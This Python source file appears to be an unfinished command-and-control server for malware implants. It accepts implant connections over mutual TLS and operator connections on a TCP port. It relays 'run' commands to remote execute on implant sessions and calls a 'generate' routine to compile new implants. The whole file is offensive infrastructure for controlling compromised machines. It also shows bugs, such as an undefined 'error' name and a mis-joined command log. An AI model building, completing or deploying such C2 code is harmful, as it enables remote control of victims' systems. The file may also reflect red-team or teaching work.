#!/usr/bin/env python3
# TODO: Convert CLI to CMD2
import logging
import sys


from mtls import mtls
from generate.generate import generate
from queue import Queue
from handler.handler import Handler

import socket
import threading
import uuid

class C2Server(object):
    connections = []

    def __init__(self):
        ## Generating stuff for implant comms ##

        self.requestq = Queue() #this is a shared que between the handler and the listner, which fills with implant registration
        self.implantlistener = mtls.Listener(self.requestq) #begins implant listener w/ mtls encryption

        self.handler = Handler(self.requestq)
        self.handler.start()
        print("Listening for implants...")
        print("Listening for operators...")

        self.shutdown = 0


        # operator listener setup
        self.clients = dict()

        self.host = ''
        self.port = 12345
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        threading.Thread(target=self.listen).start() #this is so we can listen and have execute commands from server console


    def serverMain(self):
        while self.shutdown == 0:
            userin = input("$ ")
            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
            commandStr = ' '.join(userin)
            logging.info("Command: " + commandStr)
            self.executecommand(userin.split())

    def executecommand_session(self, session_id, command):
            conn, addr = self.implantlistener.sessions.get(session_id) 
            print(f"Using session with {addr}")

            return mtls.session(conn, command) # uncomment once operator works 

            '''
            ###temporary shell -- to be removed once operator works
            while True:
                userin = input("[session] > ") 

                if userin == "exit":
                   break 

                output = mtls.session(conn, userin)

                if not output:
                    break

                sys.stdout.buffer.write(output) 
            '''

    def executecommand(self, command):
        #command is an array of strings
        if len(command) < 1:
            return

        elif command[0] == "sessions":
            return str(self.implantlistener.sessions.list()).encode('ascii')

        # Interact with a session
        elif command[0] == "run":
            if len(command) == 3:
                response = self.executecommand_session(command[1], command[2]) # TODO change whoami to operator command once it works
                return response
            else:
                return(b"Usage: run <session> <cmd>")

        # Compile an implant
        elif command[0] == "generate":
            print("Generating the implant...")
            generate(self.implantlistener.client_certs)

        else:
            return(b"Unknown Command")

    def listen(self):
        numberOfUsers = 5
        self.sock.listen(numberOfUsers)
        while True: #keep listening, start a new thread when a client connects
            client, address = self.sock.accept()

            id = str(uuid.uuid4())
            self.clients[id] = (client, address)

            print("###### client: ", client)
            print("###### address: ", address)
    

            print("\n[+]Connected to a new client at " + address[0] + ":" + str(address[1]) + "\n")
            #client.settimeout(60)
            t = threading.Thread(target = self.listenToClient,args = (client,address)).start()
            self.connections.append(address) #dont know why to do this, just seems right?

    def listenToClient(self, client, address):
        size = 1024
        while True:
            data = client.recv(size)
            if data and (str(data.decode('ascii')).lower() != 'exit'):
                recvData = str(data.decode('ascii')).lower()
                print("RECIVED: " + recvData)

                response = self.executecommand(recvData.split())

                client.send(response)
            else:
                print("[+]Disconnected " + address[0] +":"+ str(address[1]))
                raise error('Client disconnected')


def main():
    C2Server().serverMain()


if __name__ == "__main__":
    main()
